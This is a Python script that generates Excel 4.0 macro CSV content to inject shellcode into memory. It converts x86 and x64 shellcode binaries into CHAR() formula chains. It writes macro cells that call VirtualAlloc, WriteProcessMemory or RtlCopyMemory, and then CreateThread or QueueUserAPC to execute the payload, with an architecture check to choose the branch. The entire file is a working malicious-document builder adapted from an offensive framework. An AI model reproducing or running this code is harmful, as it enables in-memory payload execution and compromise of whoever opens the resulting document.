from openpyxl import Workbook, load_workbook
from itertools import zip_longest
import argparse
import sys
import codecs
import csv

parser = argparse.ArgumentParser(description='Creates CSV with Excel 4.0 Macro code to inject shellcode into memory. Outputs to "output.csv" ')
parser.add_argument('[x86 bin file]', help='the file path for your x86 shellcode file')
parser.add_argument('[x64 bin file]', help='the file path for your x64 shellcode file')
args = parser.parse_args()


#Get bin files
bin86 = sys.argv[1]
bin64 = sys.argv[2]

#Initiate Shellcode Lists
shellcode86 = []
shellcode64 = []

#Convert each byte to base 16 hex for excel. Modified from:
#https://github.com/mdsecactivebreach/SharpShooter/blob/master/modules/excel4.py
def bytes2int(byte):
    return int(codecs.encode(byte, ('hex')), 16)

#Create Shellcode. Modified code from:
#https://github.com/mdsecactivebreach/SharpShooter/blob/master/modules/excel4.py

def generateShellcode(binfile, arch):

    with open(binfile, 'rb') as sfile:
        
        i = 0
        excelShellcode = '='
        byte = sfile.read(1)

        while byte != b'':
            hexByte= str(bytes2int(byte))
            excelShellcode += f'CHAR({hexByte})'
            byte = sfile.read(1)
            i +=1
            
            if i == 20:
                if arch == 'x86':
                    shellcode86.append(excelShellcode)
                    excelShellcode = '='
                elif arch == 'x64':
                    shellcode64.append(excelShellcode)
                    excelShellcode = '='
                i = 0
            else:
                excelShellcode+=('&')

        #Append last line
        if arch == 'x64':
            shellcode64.append(excelShellcode[:-1])

        elif arch == 'x86':
            shellcode86.append(excelShellcode[:-1])

#Generate shellcode lists
generateShellcode(bin86, 'x86')
generateShellcode(bin64, 'x64')

shellcode86.append('=RETURN()')
shellcode64.append('=RETURN()')

#Write to excel
#Generate column calues
memory86 = ['=R1C7()',
            '=CALL("Kernel32","VirtualAlloc","JJJJJ",0,880,4096,64)',
            '=SELECT(R1C7:R1000:C7,R1C7)','=SET.VALUE(R1C1, 0)',
            '=WHILE(LEN(ACTIVE.CELL())>0)',
            '=CALL("Kernel32","WriteProcessMemory","JJJCJJ",-1, R2C6 + R1C1 * 20,ACTIVE.CELL(), LEN(ACTIVE.CELL()), 0)',
            '=SET.VALUE(R1C1, R1C1 + 1)','=SELECT(, "R[1]C")','=NEXT()',
            '=CALL("Kernel32","CreateThread","JJJJJJJ",0, 0, R2C6, 0, 0, 0)',
            '=WORKBOOK.ACTIVATE("Sheet1")',
            '=HALT()']

memory64 = ['=R1C3()',
            '=CALL("Kernel32","VirtualAlloc","JJJJJ",1342177280,1000,12288,64)',
            '=SELECT(R1C3:R1000:C3,R1C3)',
            '=SET.VALUE(R1C1, 0)',
            '=WHILE(LEN(ACTIVE.CELL())>0)',
            '=CALL("kernel32", "RtlCopyMemory", "JJCJ",R2C2 + R1C1 * 20,ACTIVE.CELL(),LEN(ACTIVE.CELL()))',
            '=SET.VALUE(R1C1, R1C1 + 1)',
            '=SELECT(, "R[1]C")',
            '=NEXT()',
            '=CALL("Kernel32","QueueUserAPC","JJJJ",R2C2,-2,0)',
            '=CALL("ntdll","NtTestAlert","J")',
            '=WORKBOOK.ACTIVATE("Sheet1")',
            '=HALT()']

activateMacro = ['=WORKBOOK.ACTIVATE( "Macro1")', 
                '=R1C5()']

osCheck = ['=ERROR(FALSE, R2C103:R3C103)', 
            r'C:\Program Files (x86)\Microsoft Office\AppXManifest.xml',
            '=FOPEN(R2C5, 2)',
            '=IF(ISERROR(R3C5), R1C2(), R1C6())']

#Define columns
cols = [[''], memory64, shellcode64, activateMacro, osCheck, memory86, shellcode86]

exportData = zip_longest(*cols, fillvalue = '')

#write to output.csv
with open('output.csv', 'w', newline='') as csvfile:
    writer = csv.writer(csvfile)
    writer.writerows(exportData)
    print('Done.')

